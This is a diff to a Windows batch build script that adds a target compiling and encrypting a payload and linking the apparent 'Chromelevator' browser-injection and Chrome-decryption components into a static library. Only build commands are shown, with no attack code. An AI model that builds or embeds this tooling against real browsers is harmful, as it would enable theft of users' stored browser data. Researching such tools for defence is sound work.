@@ -168,3 +168,24 @@ echo [+] Removed temporary artifacts
 echo.
 echo Build artifacts: %FINAL_EXE_NAME% + %BUILD_DIR%\chrome_decrypt.dll + %BUILD_DIR%\chrome_decrypt.enc
 goto :eof
+
+:build_lib_only
+echo Building Chromelevator as static library...
+call :compile_sqlite
+call :compile_payload
+call :encrypt_payload
+
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector_main.cpp" /Fo"%BUILD_DIR%\injector_main.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\process_manager.cpp" /Fo"%BUILD_DIR%\process_manager.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_server.cpp" /Fo"%BUILD_DIR%\pipe_server.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api.obj"
+
+lib /NOLOGO /LTCG /OUT:"build\chromelevator_%VSCMD_ARG_TGT_ARCH%.lib" ^
+    "%BUILD_DIR%\*.obj" "%BUILD_DIR%\sqlite3.lib" ^
+    bcrypt.lib ole32.lib shell32.lib advapi32.lib
+
+echo Chromelevator library built: build\chromelevator_%VSCMD_ARG_TGT_ARCH%.lib
+goto :eof
